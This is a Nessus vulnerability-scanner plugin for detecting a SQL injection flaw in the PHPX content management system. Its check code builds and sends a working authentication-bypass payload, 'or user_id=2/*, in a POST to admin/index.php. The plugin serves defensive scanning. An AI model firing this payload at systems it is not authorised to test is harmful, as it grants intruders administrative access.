#
# (C) Tenable Network Security
#


if (description) {
  script_id(20251);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-3968");
  script_bugtraq_id(15680);
  script_xref(name:"OSVDB", value:"21384");

  script_name(english:"PHPX username Parameter SQL Injection Vulnerability");
  script_summary(english:"Checks for username parameter SQL injection vulnerability in PHPX");
 
  desc = "
Synopsis :

The remote web server has a PHP application that is affected by a SQL
injection flaw. 

Description :

The remote host is running PHPX, a content management system written
in PHP. 

The installed version of PHPX does not validate input to the
'username' parameter of the 'admin/index.php' script before using it
in a database query.  Provided PHP's 'magic_quotes_gpc' setting is
off, an attacker can leverage this issue to manipulate SQL queries to,
for example, bypass authentication and gain administrative access to
the affected application. 

See also :

http://retrogod.altervista.org/phpx_359_xpl.html

Solution : 

Enable PHP's 'magic_quotes_gpc' setting. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpx", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/admin/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("form method=post action=index.php name=f" >< res) {
    # Try to exploit the flaw to bypass authentication.
    postdata = string(
      "username='or user_id=2/*&",
      "password=&",
      "login=yes"
    );
    req = string(
      "POST ", dir, "/admin/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if we can log in.
    if ("href=index.php?action=logout>Logout</a>" >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
